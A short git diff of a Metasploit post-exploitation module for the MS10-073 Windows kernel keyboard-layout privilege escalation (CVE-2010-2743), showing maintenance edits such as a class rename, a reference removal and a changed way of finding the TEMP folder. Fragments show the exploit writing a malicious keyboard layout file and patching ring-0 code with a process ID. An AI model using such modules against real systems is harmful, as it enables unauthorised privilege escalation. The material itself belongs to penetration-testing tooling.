@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,7 +8,7 @@ require 'rex'
 require 'metasm'
 
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
@@ -32,7 +32,6 @@ class Metasploit3 < Msf::Post
           [ 'OSVDB', '68552' ],
           [ 'CVE', '2010-2743' ],
           [ 'MSB', 'MS10-073' ],
-          [ 'URL', 'http://www.vupen.com/blog/20101018.Stuxnet_Win32k_Windows_Kernel_0Day_Exploit_CVE-2010-2743.php' ],
           [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=71&Itemid=1' ],
           [ 'EDB', '15985' ]
         ],
@@ -176,7 +175,7 @@ EOS
     ring0_code.gsub!('TPTP', [pid].pack('V'))
 
     # Create the malicious Keyboard Layout file...
-    tmpdir = session.fs.file.expand_path("%TEMP%")
+    tmpdir = session.sys.config.getenv('TEMP')
     fname = "p0wns.boom"
     dllpath = "#{tmpdir}\\#{fname}"
     fd = session.fs.file.new(dllpath, 'wb')
